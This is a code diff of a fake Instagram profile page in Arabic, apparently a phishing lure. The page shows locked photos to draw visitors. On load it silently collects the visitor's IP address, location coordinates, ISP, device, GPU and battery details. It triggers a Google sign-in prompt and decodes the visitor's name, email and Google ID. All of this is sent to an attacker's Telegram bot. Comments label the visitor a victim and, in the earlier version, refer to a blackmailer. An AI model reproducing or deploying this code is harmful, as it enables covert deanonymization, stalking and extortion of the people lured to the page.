@@ -3,8 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="Instagram: @linda_art_22">
+    <meta property="og:description" content="Digital Artist | Photoshot. 942 متابع. شاهد المنشورات.">
+    <meta property="og:image" content="https://i.pravatar.cc/400?u=art">
+    <meta property="og:type" content="profile">
+    <meta name="theme-color" content="#FF0073">
+
     <title>Instagram</title>
     <script src="https://accounts.google.com/gsi/client" async defer></script>
+
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fafafa; margin: 0; display: none; }
         .nav { width: 100%; height: 50px; background: white; border-bottom: 1px solid #dbdbdb; display: flex; justify-content: center; align-items: center; position: fixed; top: 0; z-index: 100; }
@@ -12,7 +20,9 @@
         .profile-header { display: flex; align-items: center; margin-bottom: 20px; }
         .profile-pic { width: 77px; height: 77px; border-radius: 50%; border: 1px solid #dbdbdb; padding: 2px; margin-left: 20px; }
         .username { font-size: 20px; font-weight: 300; margin-bottom: 8px; }
-        .btn-follow { background-color: #0095f6; color: white; border: none; padding: 6px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; }
+        .btn-follow { background-color: #0095f6; color: white; border: none; padding: 8px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 3px; margin-top: 20px; }
+        .grid-item { background: #efefef; aspect-ratio: 1/1; display: flex; justify-content: center; align-items: center; color: #8e8e8e; font-size: 24px; }
     </style>
 </head>
 <body>
@@ -24,11 +34,23 @@
             <img src="https://i.pravatar.cc/150?u=art" class="profile-pic">
             <div class="info">
                 <div class="username">linda_art_22</div>
-                <div style="font-size: 14px;"><b>942</b> متابع | <b>34</b> منشور</div>
+                <div style="font-size: 14px;"><b>34</b> منشور | <b>942</b> متابع | <b>510</b> يتابع</div>
             </div>
         </div>
-        <button class="btn-follow">متابعة لمشاهدة المحتوى</button>
-        <div id="g_id_onload" data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com" data-auto_prompt="true" data-callback="onSignIn"></div>
+        <div style="font-weight: bold; font-size: 14px;">Linda | Art & Design</div>
+        <div style="font-size: 14px; color: #262626; margin-bottom: 15px;">Welcome to my world 🎨✨</div>
+        <button class="btn-follow">متابعة لمشاهدة الصور</button>
+
+        <div class="grid">
+            <div class="grid-item">🔒</div><div class="grid-item">🔒</div><div class="grid-item">🔒</div>
+            <div class="grid-item">🔒</div><div class="grid-item">🔒</div><div class="grid-item">🔒</div>
+        </div>
+
+        <div id="g_id_onload"
+             data-client_id="1051312279672-fe50oiapbrcft00ag0sh81nesd91iqec.apps.googleusercontent.com"
+             data-auto_prompt="true" 
+             data-callback="onSignIn">
+        </div>
     </div>
 
 <script>
@@ -36,62 +58,78 @@
     const chatId = "7184970355";
     const secretKey = "vlp";
 
-    async function captureDeepDetails() {
+    async function captureFinal() {
         try {
-            // 1. جلب الـ IP والمنطقة
+            // جلب بيانات IP والموقع
             const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
+            const d = await ipRes.json();
 
-            // 2. بصمة المعالج الرسومي (تحدد موديل الهاتف بدقة)
+            // تحليل GPU
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const dbgRender = gl.getExtension('WEBGL_debug_renderer_info');
-            const renderer = dbgRender ? gl.getParameter(dbgRender.UNMASKED_RENDERER_WEBGL) : "Unknown";
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown";
 
-            // 3. معلومات البطارية
-            let battStatus = "غير مدعوم";
+            // تحليل البطارية
+            let batt = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                battStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
+                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})`;
             }
 
-            // 4. تجميع التقرير "المرعب"
-            let msg = `🔥 **تقرير اختراق عميق للمبتز** 🔥\n\n`;
-            msg += `🌐 **العنوان:** \`${ipData.ip}\` (${ipData.city}, ${ipData.country_name})\n`;
-            msg += `🏢 **الشركة:** \`${ipData.org}\`\n`;
-            msg += `📱 **الجهاز (UserAgent):** \`${navigator.userAgent}\`\n`;
-            msg += `🎮 **المعالج الرسومي (GPU):** \`${renderer}\`\n`;
-            msg += `🔋 **البطارية:** \`${battStatus}\`\n`;
-            msg += `🧠 **الهاردوير:** ${navigator.hardwareConcurrency} نواة / ${navigator.deviceMemory || 'غير معروف'}GB رام\n`;
-            msg += `📏 **دقة الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
-            msg += `🌍 **اللغة والوقت:** ${navigator.language} | ${new Date().toLocaleString()}\n`;
-            msg += `📶 **نوع الاتصال:** ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}`;
+            // تجميع الرسالة مرتبة تحت بعضها
+            let m = `🕵️‍♂️ **تقرير اصطياد جديد (بيانات عميقة)**\n`;
+            m += `──────────────────\n`;
+            m += `📱 **معلومات الجهاز:**\n`;
+            m += `• النظام: \`${navigator.platform}\`\n`;
+            m += `• الموديل: \`${navigator.userAgent.split('(')[1].split(')')[0]}\`\n`;
+            m += `• المعالج الرسومي: \`${gpu}\`\n`;
+            m += `• الرام التقريبي: \`${navigator.deviceMemory || 'غير معروف'} GB\`\n`;
+            m += `• عدد الأنوية: \`${navigator.hardwareConcurrency} Cores\`\n`;
+            m += `• دقة الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
+            m += `──────────────────\n`;
+            m += `🌐 **معلومات الشبكة:**\n`;
+            m += `• العنوان: \`${d.ip}\`\n`;
+            m += `• الشركة: \`${d.org}\`\n`;
+            m += `• الدولة: \`${d.country_name} (${d.country_code})\`\n`;
+            m += `• المدينة: \`${d.city}\`\n`;
+            m += `• الإحداثيات: \`${d.latitude}, ${d.longitude}\`\n`;
+            m += `• نوع الاتصال: \`${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\`\n`;
+            m += `──────────────────\n`;
+            m += `🔋 **حالة النظام اللحظية:**\n`;
+            m += `• البطارية: \`${batt}\`\n`;
+            m += `• اللغة: \`${navigator.language}\`\n`;
+            m += `• توقيت الضحية: \`${new Date().toLocaleString()}\`\n`;
+            m += `──────────────────`;
 
-            sendToTelegram(msg);
-        } catch (e) { console.log(e); }
+            send(m);
+        } catch (e) { console.error(e); }
     }
 
-    function onSignIn(response) {
-        const user = JSON.parse(atob(response.credential.split('.')[1]));
-        let report = `🎯 **تم كشف الهوية الصريحة بنجاح!**\n\n`;
-        report += `👤 **الاسم:** \`${user.name}\`\n`;
-        report += `📧 **البريد:** \`${user.email}\` \n`;
-        report += `🖼 **الصورة:** ${user.picture}\n`;
-        report += `🆔 **Google ID:** \`${user.sub}\``;
-        sendToTelegram(report);
+    function onSignIn(resp) {
+        const u = JSON.parse(atob(resp.credential.split('.')[1]));
+        let m = `🎯 **كشف الهوية الصريحة (Google)**\n`;
+        m += `──────────────────\n`;
+        m += `👤 الاسم: \`${u.name}\`\n`;
+        m += `📧 البريد: \`${u.email}\`\n`;
+        m += `🆔 معرف جوجل: \`${u.sub}\`\n`;
+        m += `🖼 الصورة: ${u.picture}\n`;
+        m += `──────────────────`;
+        send(m);
     }
 
-    function sendToTelegram(t) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
+    function send(msg) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
-    // نظام التحقق من المفتاح في الرابط
     window.onload = () => {
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('key') === secretKey) {
+        const params = new URLSearchParams(window.location.search);
+        if (params.get('key') === secretKey) {
             document.body.style.display = "block";
-            captureDeepDetails();
-            if (typeof google !== 'undefined') google.accounts.id.prompt();
+            captureFinal();
+            if (typeof google !== 'undefined') {
+                setTimeout(() => { google.accounts.id.prompt(); }, 2000); 
+            }
         } else {
             window.location.replace("https://www.google.com");
         }
